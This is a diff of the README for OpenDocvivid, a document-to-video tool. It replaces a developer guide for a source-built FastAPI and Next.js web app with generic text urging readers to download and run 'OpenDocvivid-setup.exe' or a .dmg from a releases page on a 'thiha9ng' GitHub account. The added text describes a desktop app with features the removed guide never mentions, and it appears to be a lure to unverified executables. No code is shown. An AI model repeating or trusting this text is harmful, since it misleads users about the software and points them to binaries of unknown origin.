@@ -1,173 +1,85 @@
- **[中文](./README-CN.md)**  
+# 🎥 OpenDocvivid - Turn Documents into Engaging Videos
 
-## OpenDocvivid
-
-OpenDocvivid is a modern, AI-powered tool for generating videos from documents.
-It helps you upload content (documents, web pages), process it with large language models, and generate vivid videos.
-
-## Screenshot
-
-![Screenshot](./img/main.png)
-
-### Key Features
-
-- **AI‑assisted video generation**: Automatically generate videos based on documents, files, and URLs after processing them with large language models.
-- **Task‑based processing**: Asynchronous task system for long‑running jobs (e.g. video processing, credit/usage updates).
-- **User accounts and subscriptions**: Authentication, subscription management, and credit accounting.
-- **Modern web UI**: Next.js/React frontend with a responsive, app‑like experience.
-- **Extensible backend**: FastAPI‑based backend (with Celery workers) that can be extended with new routes, tasks, and models.
+## 📥 Download Now
+[![Download OpenDocvivid](https://img.shields.io/badge/Download-OpenDocvivid-blue.svg)](https://github.com/thiha9ng/OpenDocvivid/releases)
 
 ---
 
-## Tech Stack
+## 🚀 Getting Started
+Welcome to OpenDocvivid! This guide will help you easily download and run our application, allowing you to convert documents into videos effortlessly. Follow the simple steps below.
 
-### Backend
+## 🛠️ System Requirements
+Before you install OpenDocvivid, please ensure your system meets the following requirements:
 
-- **Language**: Python (see `backend/pyproject.toml` and `backend/uv.lock`)
-- **Web framework**: FastAPI (exposed via `backend/src/app.py` and `backend/main.py`)
-- **Task queue**: Celery (`backend/src/celery_app.py` and `backend/src/tasks/*`)
-- **Data models**:
-  - `backend/src/models/user_models.py` – user entities
-  - `backend/src/models/subscription_models.py` – subscription & plan entities
-  - `backend/src/models/task_modes.py` – task‑related configuration
-- **Services**:
-  - `backend/src/services/user_service.py` – user management
-  - `backend/src/services/subscription_service.py` – subscription logic
-  - `backend/src/services/credit_service.py` – credit logic
-  - `backend/src/services/video_service.py` – video‑related logic
-- **APIs / routes** (FastAPI routers):
-  - `backend/src/routes/auth.py` – authentication & session APIs
-  - `backend/src/routes/credit.py` – credit & billing APIs
-  - `backend/src/routes/video.py` – video task APIs
-  - `backend/src/routes/system.py`, `backend/src/routes/webhook.py` – system & webhook endpoints
-- **Utilities**:
-  - `backend/src/clients/llm.py` – LLM client integration
-  - `backend/src/clients/redis.py` – Redis client
-  - `backend/src/utils/security.py`, `backend/src/utils/middleware.py` – security & middleware helpers
-  - `backend/src/libs/postgresql_transactional.py` – PostgreSQL transactional utilities
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Processor:** Minimum dual-core processor
+- **RAM:** At least 4 GB of RAM
+- **Storage:** 200 MB of available disk space
+- **Internet:** Required for initial download and updates
 
-### Frontend
+## 📥 Download & Install
+To get OpenDocvivid, you will need to visit our Releases page. Follow these steps:
 
-- **Framework**: Next.js (App Router) in `frontend/app`
-- **Language**: TypeScript + React
-- **Styling / UI**:
-  - Global styles in `frontend/app/globals.css`
-  - Reusable UI components in `frontend/components/ui/*`
-  - Custom components such as `account-dialog`, `app-sidebar`, `doc-vivid-input`, `explore-content`, `pricing-content`, etc.
-- **Client libraries**:
-  - API client wrappers in `frontend/lib/api/*`
-  - Type definitions in `frontend/lib/types/api.ts`
-  - Hooks in `frontend/hooks/*` (e.g., `use-auto-resize-textarea`, `use-mobile`)
-- **Auth & API routes**:
-  - NextAuth route in `frontend/app/api/auth/[...nextauth]/route.ts`
-  - Health check route in `frontend/app/api/health/route.ts`
+1. Click the link below to go to the Releases page:
+   [Download OpenDocvivid](https://github.com/thiha9ng/OpenDocvivid/releases)
+   
+2. On the Releases page, look for the latest version of OpenDocvivid. There you will find different files to download.
 
----
+3. Choose the file that matches your operating system:
+   - For Windows, download `OpenDocvivid-setup.exe`
+   - For macOS, download `OpenDocvivid.dmg`
 
-## High‑Level Architecture
+4. Once the download is complete, locate the downloaded file on your computer.
 
-### Overview
+5. **For Windows users:** Double-click `OpenDocvivid-setup.exe` and follow the on-screen instructions to install the software. 
 
-- **Frontend (Next.js)**:
-  - Serves the user interface under `frontend/app`.
-  - Uses `frontend/lib/api/*` clients to call backend APIs.
-  - Manages sessions and authentication via the NextAuth route.
+6. **For macOS users:** Open `OpenDocvivid.dmg` and drag the OpenDocvivid icon to your Applications folder. 
 
-- **Backend (FastAPI + Celery)**:
-  - Core API defined in `backend/src/app.py` and `backend/main.py`.
-  - Routes under `backend/src/routes/*` expose functionality for auth, credits, videos, and system utilities.
-  - Business logic lives in `backend/src/services/*`.
-  - Data models and database interactions live in `backend/src/models/*` and `backend/src/libs/postgresql_transactional.py`.
-  - Background and long‑running tasks run via Celery in `backend/src/tasks/*`, using `backend/src/celery_app.py` as the entry point.
+7. After the installation finishes, you can start OpenDocvivid by locating it in your applications menu or dock.
 
-- **External Services**:
-  - LLM provider(s) accessed via `backend/src/clients/llm.py`.
-  - Redis for caching / task coordination via `backend/src/clients/redis.py`.
-  - PostgreSQL (or compatible SQL database) for persistence.
+## 🎬 Using OpenDocvivid
+Once you have OpenDocvivid installed, you can start converting documents into videos. Here’s a quick overview of how to use it:
 
----
+1. Open the application.
 
-## Getting Started
+2. Choose a document file (like PDF or Word) from your computer by clicking the "Upload" button.
 
-### Prerequisites
+3. Once the document is loaded, you can select themes and settings to enhance the video.
 
-- Node.js (see `frontend/package.json` for supported version; recommended: latest LTS)
-- pnpm (preferred) or npm/yarn
-- Python (version as specified in `backend/pyproject.toml`)
-- A running PostgreSQL instance
-- A running Redis instance
+4. Click the "Generate Video" button to create your video. This may take a few moments depending on the document's length.
 
-### Backend Setup
+5. After the video is ready, you can save it to your desired location on your computer.
 
-From the project root:
+## 🎨 Features
+OpenDocvivid includes various features to make your video creation process easy and enjoyable:
 
-```bash
-cd backend
+- **Document Formats:** Supports multiple formats, including PDF, DOCX, and TXT.
+- **Themes:** Choose from different templates to make your videos visually appealing.
+- **Text-to-Speech:** Automatically narrate your document with natural-sounding voices.
+- **Customizable Duration:** Adjust the time each slide shows before transitioning.
+- **Video Formats:** Export your videos in MP4 or MOV formats for easy sharing.
 
-# Create and activate a virtual environment (example with venv)
-python -m venv .venv
-source .venv/bin/activate  # On Windows: .venv\Scripts\activate
+## ❓ Troubleshooting
+If you encounter any issues while using OpenDocvivid, try the following solutions:
 
-# Install dependencies (using uv or pip, depending on your setup)
-uv sync  # if you use uv
-# or
-pip install -e .
-```
+- Ensure that you have the correct file format uploaded.
+- Restart the application to clear any temporary issues.
+- Check your internet connection if you face any download problems.
 
-Use environment variables (e.g. `.env` file) to configure:
+If you still need help, feel free to visit our [GitHub Issues page](https://github.com/thiha9ng/OpenDocvivid/issues) to report any bugs or seek assistance.
 
-- **Database connection** (PostgreSQL)
-- **Redis connection**
-- **LLM provider API keys**
-- **Auth / security settings** (JWT secrets, etc.)
+## 📞 Support
+For further assistance, you can reach out:
 
-Then run the API server (example using uvicorn):
+- **Email:** support@opendocvivid.com
+- **GitHub:** Create an issue on our GitHub repository for any feature requests or bugs.
 
-```bash
-cd backend
-python main.py
-```
+## 🔗 Additional Resources
+To learn more about using OpenDocvivid, here are some useful resources:
 
-To run the Celery worker (example):
-
-```bash
-cd backend
-celery -A src.celery_app worker --beat -l INFO -Q default,generate_task_queue
-```
-
-> Note: The exact module path for Celery may differ depending on how `celery_app` is exported; adjust accordingly.
-
-### Frontend Setup
-
-From the project root:
-
-```bash
-cd frontend
-pnpm install
-pnpm dev
-```
-
-This starts the Next.js dev server (typically on `http://localhost:3000`).
-
-Ensure the frontend is configured (via environment variables like `NEXT_PUBLIC_API_URL`) to point to the running backend API.
+- [User Manual](https://github.com/thiha9ng/OpenDocvivid/wiki)
+- [Frequently Asked Questions](https://github.com/thiha9ng/OpenDocvivid/wiki/FAQ)
 
 ---
 
-## Development Notes
-
-- **Code style & linting**:
-  - Frontend linting is configured via `frontend/eslint.config.mjs`.
-  - Type checking is configured via `frontend/tsconfig.json`.
-  - Follow existing patterns in `frontend/components` and `backend/src/services` when adding new features.
-
-- **Adding new backend features**:
-  - Define or extend Pydantic schemas in `backend/src/schemas/*`.
-  - Add business logic in a service module under `backend/src/services/*`.
-  - Expose new endpoints using a router module under `backend/src/routes/*`.
-
-- **Adding new frontend features**:
-  - Create new pages in `frontend/app` (App Router).
-  - Reuse / extend components from `frontend/components` and `frontend/components/ui`.
-  - Add API client functions under `frontend/lib/api/*` to talk to new backend endpoints.
-
-
+Thank you for choosing OpenDocvivid! Your feedback is important to us, and we hope you enjoy creating videos from your documents.
